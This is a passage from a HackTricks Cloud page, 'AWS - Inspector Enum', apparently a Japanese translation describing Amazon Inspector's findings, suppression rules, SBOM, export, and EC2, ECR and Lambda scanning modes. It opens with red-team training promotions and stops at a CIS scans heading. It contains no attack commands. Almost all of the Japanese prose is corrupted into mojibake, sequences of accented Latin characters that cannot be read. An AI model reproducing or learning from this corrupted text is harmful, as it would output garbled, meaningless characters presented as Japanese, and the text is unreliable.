# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

### Inspector

Amazon Inspectorã¯ã€AWSç’°å¢ƒã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸé«˜åº¦ãªè‡ªå‹•è„†å¼±æ€§ç®¡ç†ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯ã€Amazon EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã€Amazon ECRã®ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã€Amazon ECSã€ãŠã‚ˆã³AWS Lambdaé–¢æ•°ã‚’è„†å¼±æ€§ã‚„æ„å›³ã—ãªã„ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯éœ²å‡ºã®ãŸã‚ã«ç¶™ç¶šçš„ã«ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ã€‚å …ç‰¢ãªè„†å¼±æ€§ã‚¤ãƒ³ãƒ†ãƒªã‚¸ã‚§ãƒ³ã‚¹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’æ´»ç”¨ã™ã‚‹ã“ã¨ã§ã€Amazon Inspectorã¯ã€æ·±åˆ»åº¦ãƒ¬ãƒ™ãƒ«ã‚„ä¿®æ­£æ¨å¥¨ã‚’å«ã‚€è©³ç´°ãªçµæœã‚’æä¾›ã—ã€çµ„ç¹”ãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’ç©æ¥µçš„ã«ç‰¹å®šã—å¯¾å‡¦ã™ã‚‹ã®ã‚’æ”¯æ´ã—ã¾ã™ã€‚ã“ã®åŒ…æ‹¬çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ã•ã¾ã–ã¾ãªAWSã‚µãƒ¼ãƒ“ã‚¹å…¨ä½“ã§å¼·åŒ–ã•ã‚ŒãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å§¿å‹¢ã‚’ç¢ºä¿ã—ã€ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã¨ãƒªã‚¹ã‚¯ç®¡ç†ã‚’æ”¯æ´ã—ã¾ã™ã€‚

### Key elements

#### Findings

Amazon Inspectorã®Findingsã¯ã€EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã€ECRãƒªãƒã‚¸ãƒˆãƒªã€ã¾ãŸã¯Lambdaé–¢æ•°ã®ã‚¹ã‚­ãƒ£ãƒ³ä¸­ã«ç™ºè¦‹ã•ã‚ŒãŸè„†å¼±æ€§ã‚„éœ²å‡ºã«é–¢ã™ã‚‹è©³ç´°ãªãƒ¬ãƒãƒ¼ãƒˆã§ã™ã€‚çŠ¶æ…‹ã«åŸºã¥ã„ã¦ã€Findingsã¯æ¬¡ã®ã‚ˆã†ã«åˆ†é¡ã•ã‚Œã¾ã™ï¼š

* **Active**: Findingã¯ä¿®æ­£ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚
* **Closed**: Findingã¯ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚
* **Suppressed**: Findingã¯1ã¤ä»¥ä¸Šã®**suppression rules**ã«ã‚ˆã‚Šã“ã®çŠ¶æ…‹ã«ãƒãƒ¼ã‚¯ã•ã‚Œã¦ã„ã¾ã™ã€‚

Findingsã¯æ¬¡ã®3ã¤ã®ã‚¿ã‚¤ãƒ—ã«ã‚‚åˆ†é¡ã•ã‚Œã¾ã™ï¼š

* **Package**: ã“ã‚Œã‚‰ã®Findingsã¯ã€ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®è„†å¼±æ€§ã«é–¢é€£ã—ã¦ã„ã¾ã™ã€‚ä¾‹ã¨ã—ã¦ã¯ã€å¤ã„ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚„æ—¢çŸ¥ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã‚’æŒã¤ä¾å­˜é–¢ä¿‚ãŒå«ã¾ã‚Œã¾ã™ã€‚
* **Code**: ã“ã®ã‚«ãƒ†ã‚´ãƒªã«ã¯ã€AWSãƒªã‚½ãƒ¼ã‚¹ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚³ãƒ¼ãƒ‰ã«è¦‹ã¤ã‹ã£ãŸè„†å¼±æ€§ãŒå«ã¾ã‚Œã¾ã™ã€‚ä¸€èˆ¬çš„ãªå•é¡Œã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚¨ãƒ©ãƒ¼ã‚„ä¸å®‰å…¨ãªãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã§ã™ã€‚
* **Network**: ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯Findingsã¯ã€æ”»æ’ƒè€…ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ§‹æˆã®æ½œåœ¨çš„ãªéœ²å‡ºã‚’ç‰¹å®šã—ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ¼ãƒˆã€ä¸å®‰å…¨ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã€ãŠã‚ˆã³èª¤è¨­å®šã•ã‚ŒãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ãŒå«ã¾ã‚Œã¾ã™ã€‚

#### Filters and Suppression Rules

Amazon Inspectorã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¨æŠ‘åˆ¶ãƒ«ãƒ¼ãƒ«ã¯ã€Findingsã®ç®¡ç†ã¨å„ªå…ˆé †ä½ä»˜ã‘ã‚’æ”¯æ´ã—ã¾ã™ã€‚ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ·±åˆ»åº¦ã‚„ãƒªã‚½ãƒ¼ã‚¹ã‚¿ã‚¤ãƒ—ãªã©ã®ç‰¹å®šã®åŸºæº–ã«åŸºã¥ã„ã¦Findingsã‚’çµã‚Šè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚æŠ‘åˆ¶ãƒ«ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ä½ãƒªã‚¹ã‚¯ã¨è¦‹ãªã•ã‚Œã‚‹ã€ã™ã§ã«è»½æ¸›ã•ã‚ŒãŸã€ã¾ãŸã¯ãã®ä»–ã®é‡è¦ãªç†ç”±ã«ã‚ˆã‚ŠæŠ‘åˆ¶ã•ã‚Œã‚‹ã¹ãç‰¹å®šã®Findingsã‚’æŠ‘åˆ¶ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¬ãƒãƒ¼ãƒˆã®éè² è·ã‚’é˜²ãã€ã‚ˆã‚Šé‡è¦ãªå•é¡Œã«é›†ä¸­ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

#### Software Bill of Materials (SBOM)

Amazon Inspectorã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢éƒ¨å“è¡¨ï¼ˆSBOMï¼‰ã¯ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚„ä¾å­˜é–¢ä¿‚ã‚’å«ã‚€ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸å†…ã®ã™ã¹ã¦ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è©³ç´°ãªã‚¨ã‚¯ã‚¹ãƒãƒ¼ã‚¿ãƒ–ãƒ«ãƒã‚¹ãƒˆã•ã‚ŒãŸã‚¤ãƒ³ãƒ™ãƒ³ãƒˆãƒªãƒªã‚¹ãƒˆã§ã™ã€‚SBOMã¯ã€ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚µãƒ—ãƒ©ã‚¤ãƒã‚§ãƒ¼ãƒ³ã®é€æ˜æ€§ã‚’æä¾›ã—ã€ã‚ˆã‚Šè‰¯ã„è„†å¼±æ€§ç®¡ç†ã¨ã‚³ãƒ³ãƒ—ãƒ©ã‚¤ã‚¢ãƒ³ã‚¹ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãŠã‚ˆã³ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«é–¢é€£ã™ã‚‹ãƒªã‚¹ã‚¯ã‚’ç‰¹å®šã—è»½æ¸›ã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚

### Key features

#### Export findings

Amazon Inspectorã¯ã€Amazon S3ãƒã‚±ãƒƒãƒˆã€Amazon EventBridgeã€ãŠã‚ˆã³AWS Security Hubã«Findingsã‚’ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã™ã‚‹æ©Ÿèƒ½ã‚’æä¾›ã—ã€ç‰¹å®šã®æ—¥ä»˜ã¨æ™‚åˆ»ã«è­˜åˆ¥ã•ã‚ŒãŸè„†å¼±æ€§ã‚„éœ²å‡ºã®è©³ç´°ãªãƒ¬ãƒãƒ¼ãƒˆã‚’ç”Ÿæˆã§ãã¾ã™ã€‚ã“ã®æ©Ÿèƒ½ã¯ã€CSVã‚„JSONãªã©ã®ã•ã¾ã–ã¾ãªå‡ºåŠ›å½¢å¼ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãŠã‚Šã€ä»–ã®ãƒ„ãƒ¼ãƒ«ã‚„ã‚·ã‚¹ãƒ†ãƒ ã¨ã®çµ±åˆã‚’å®¹æ˜“ã«ã—ã¾ã™ã€‚ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆæ©Ÿèƒ½ã¯ã€ãƒ¬ãƒãƒ¼ãƒˆã«å«ã¾ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã®ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã‚’å¯èƒ½ã«ã—ã€æ·±åˆ»åº¦ã€ãƒªã‚½ãƒ¼ã‚¹ã‚¿ã‚¤ãƒ—ã€ã¾ãŸã¯æ—¥ä»˜ç¯„å›²ãªã©ã®ç‰¹å®šã®åŸºæº–ã«åŸºã¥ã„ã¦Findingsã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ç¾åœ¨ã®AWSãƒªãƒ¼ã‚¸ãƒ§ãƒ³å†…ã®ã™ã¹ã¦ã®Activeã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã®Findingsã‚’å«ã‚ã¾ã™ã€‚

Findingsã‚’ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã™ã‚‹éš›ã«ã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆä¸­ã«æš—å·åŒ–ã™ã‚‹ãŸã‚ã«Key Management Serviceï¼ˆKMSï¼‰ã‚­ãƒ¼ãŒå¿…è¦ã§ã™ã€‚KMSã‚­ãƒ¼ã¯ã€ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚ŒãŸFindingsãŒä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‹ã‚‰ä¿è­·ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã€æ©Ÿå¯†ã®è„†å¼±æ€§æƒ…å ±ã«å¯¾ã™ã‚‹è¿½åŠ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å±¤ã‚’æä¾›ã—ã¾ã™ã€‚

#### Amazon EC2 instances scanning

Amazon Inspectorã¯ã€Amazon EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®è„†å¼±æ€§ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªã‚¹ã‚­ãƒ£ãƒ³æ©Ÿèƒ½ã‚’æä¾›ã—ã¾ã™ã€‚Inspectorã¯ã€EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‹ã‚‰æŠ½å‡ºã•ã‚ŒãŸãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¢ãƒ‰ãƒã‚¤ã‚¶ãƒªãƒ¼ã®ãƒ«ãƒ¼ãƒ«ã¨æ¯”è¼ƒã—ã¦ã€ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®è„†å¼±æ€§ã‚„ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ°é”æ€§ã®å•é¡Œã‚’ç”Ÿæˆã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¹ã‚­ãƒ£ãƒ³ã¯ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®**ã‚¹ã‚­ãƒ£ãƒ³ãƒ¢ãƒ¼ãƒ‰**è¨­å®šã«å¿œã˜ã¦ã€**ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ™ãƒ¼ã‚¹**ã¾ãŸã¯**ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ¬ã‚¹**ã®æ–¹æ³•ã§å®Ÿè¡Œã§ãã¾ã™ã€‚

* **Agent-Based**: AWS Systems Managerï¼ˆSSMï¼‰ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’åˆ©ç”¨ã—ã¦ã€è©³ç´°ãªã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿæ–½ã—ã¾ã™ã€‚ã“ã®æ–¹æ³•ã§ã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‹ã‚‰ç›´æ¥ãƒ‡ãƒ¼ã‚¿ã‚’åé›†ã—ã€åˆ†æã—ã¾ã™ã€‚
* **Agentless**: ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒãªã„è»½é‡ãªä»£æ›¿æ‰‹æ®µã‚’æä¾›ã—ã€EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®å„ãƒœãƒªãƒ¥ãƒ¼ãƒ ã®EBSã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½œæˆã—ã€è„†å¼±æ€§ã‚’æ¢ã—ã€ãã®å¾Œå‰Šé™¤ã—ã¾ã™ã€‚æ—¢å­˜ã®AWSã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã‚’åˆ©ç”¨ã—ã¦ã‚¹ã‚­ãƒ£ãƒ³ã‚’è¡Œã„ã¾ã™ã€‚

ã‚¹ã‚­ãƒ£ãƒ³ãƒ¢ãƒ¼ãƒ‰ã¯ã€EC2ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹æ–¹æ³•ã‚’æ±ºå®šã—ã¾ã™ï¼š

* **Agent-Based**: EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«SSMã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦æ·±ã„æ¤œæŸ»ã‚’è¡Œã„ã¾ã™ã€‚
* **Hybrid Scanning**: ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ™ãƒ¼ã‚¹ã¨ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ¬ã‚¹ã®ä¸¡æ–¹ã®æ–¹æ³•ã‚’çµ„ã¿åˆã‚ã›ã¦ã€ã‚«ãƒãƒ¬ãƒƒã‚¸ã‚’æœ€å¤§åŒ–ã—ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¸ã®å½±éŸ¿ã‚’æœ€å°é™ã«æŠ‘ãˆã¾ã™ã€‚SSMã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ã¯ã€Inspectorã¯ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ™ãƒ¼ã‚¹ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã—ã€SSMã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãŒãªã„å ´åˆã¯ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãƒ¬ã‚¹ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

ã‚‚ã†1ã¤ã®é‡è¦ãªæ©Ÿèƒ½ã¯ã€EC2 Linuxã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®**æ·±ã„æ¤œæŸ»**ã§ã™ã€‚ã“ã®æ©Ÿèƒ½ã¯ã€EC2 Linuxã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¨æ§‹æˆã®å¾¹åº•çš„ãªåˆ†æã‚’æä¾›ã—ã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®è„†å¼±æ€§ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã€èª¤è¨­å®šã‚’å«ã‚€è©³ç´°ãªè„†å¼±æ€§è©•ä¾¡ã‚’æä¾›ã—ã€åŒ…æ‹¬çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ã‚’ç¢ºä¿ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€**ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¹**ã¨ãã®ã™ã¹ã¦ã®ã‚µãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ¤œæŸ»ã‚’é€šã˜ã¦å®Ÿç¾ã•ã‚Œã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Amazon Inspectorã¯ä»¥ä¸‹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã¾ã™ãŒã€å„ãƒ¡ãƒ³ãƒãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¯æœ€å¤§5ã¤ã®ã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¹ã‚’å®šç¾©ã§ãã€å„å§”ä»»ç®¡ç†è€…ã¯æœ€å¤§10å€‹ã‚’å®šç¾©ã§ãã¾ã™ï¼š

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon Inspectorã¯ã€Amazon Elastic Container Registryï¼ˆECRï¼‰ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã®ãŸã‚ã®å¼·åŠ›ãªã‚¹ã‚­ãƒ£ãƒ³æ©Ÿèƒ½ã‚’æä¾›ã—ã€ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®è„†å¼±æ€§ãŒåŠ¹ç‡çš„ã«æ¤œå‡ºãŠã‚ˆã³ç®¡ç†ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚

* **Basic Scanning**: ã“ã‚Œã¯ã€ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®Clairãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã®æ¨™æº–çš„ãªãƒ«ãƒ¼ãƒ«ã‚»ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸å†…ã®æ—¢çŸ¥ã®OSãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®è„†å¼±æ€§ã‚’ç‰¹å®šã™ã‚‹è¿…é€Ÿã§è»½é‡ãªã‚¹ã‚­ãƒ£ãƒ³ã§ã™ã€‚ã“ã®ã‚¹ã‚­ãƒ£ãƒ³è¨­å®šã§ã¯ã€ãƒªãƒã‚¸ãƒˆãƒªã¯ãƒ—ãƒƒã‚·ãƒ¥æ™‚ã«ã‚¹ã‚­ãƒ£ãƒ³ã•ã‚Œã‚‹ã‹ã€æ‰‹å‹•ã‚¹ã‚­ãƒ£ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
* **Enhanced Scanning**: ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã€ãƒ—ãƒƒã‚·ãƒ¥ã‚¹ã‚­ãƒ£ãƒ³ã«åŠ ãˆã¦ç¶™ç¶šçš„ã‚¹ã‚­ãƒ£ãƒ³æ©Ÿèƒ½ã‚’è¿½åŠ ã—ã¾ã™ã€‚Enhanced Scanningã¯ã€å„ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã®å±¤ã‚’ã‚ˆã‚Šæ·±ãæ˜ã‚Šä¸‹ã’ã¦ã€OSãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚„ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®è„†å¼±æ€§ã‚’ã‚ˆã‚Šé«˜ã„ç²¾åº¦ã§ç‰¹å®šã—ã¾ã™ã€‚ãƒ™ãƒ¼ã‚¹ã‚¤ãƒ¡ãƒ¼ã‚¸ã¨è¿½åŠ ã®å±¤ã®ä¸¡æ–¹ã‚’åˆ†æã—ã€æ½œåœ¨çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã®åŒ…æ‹¬çš„ãªãƒ“ãƒ¥ãƒ¼ã‚’æä¾›ã—ã¾ã™ã€‚

#### Amazon Lambda functions scanning

Amazon Inspectorã¯ã€AWS Lambdaé–¢æ•°ã¨ãã®ãƒ¬ã‚¤ãƒ¤ãƒ¼ã®ãŸã‚ã®åŒ…æ‹¬çš„ãªã‚¹ã‚­ãƒ£ãƒ³æ©Ÿèƒ½ã‚’å«ã¿ã€ã‚µãƒ¼ãƒãƒ¼ãƒ¬ã‚¹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨æ•´åˆæ€§ã‚’ç¢ºä¿ã—ã¾ã™ã€‚Inspectorã¯ã€Lambdaé–¢æ•°ã®ãŸã‚ã«2ç¨®é¡ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’æä¾›ã—ã¾ã™ï¼š

* **Lambda standard scanning**: ã“ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆæ©Ÿèƒ½ã¯ã€Lambdaé–¢æ•°ã¨ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«è¿½åŠ ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®ä¾å­˜é–¢ä¿‚ã«ãŠã‘ã‚‹ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®è„†å¼±æ€§ã‚’ç‰¹å®šã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€é–¢æ•°ãŒæ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æŒã¤ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆä¾‹ï¼špython-jwtï¼‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€FindingãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚
* **Lambda code scanning**: ã‚«ã‚¹ã‚¿ãƒ ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã‚’åˆ†æã—ã€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®æ¬ é™¥ã€ãƒ‡ãƒ¼ã‚¿æ¼æ´©ã€å¼±ã„æš—å·åŒ–ã€æš—å·åŒ–ã®æ¬ å¦‚ãªã©ã®è„†å¼±æ€§ã‚’æ¤œå‡ºã—ã¾ã™ã€‚æ¤œå‡ºã•ã‚ŒãŸè„†å¼±æ€§ã‚’å¼·èª¿ã™ã‚‹ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚Findingsã«ã¯ã€å•é¡Œã‚’ä¿®æ­£ã™ã‚‹ãŸã‚ã®è©³ç´°ãªä¿®æ­£ææ¡ˆã¨ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆãŒå«ã¾ã‚Œã¾ã™ã€‚

#### **Center for Internet Security (CIS) scans**

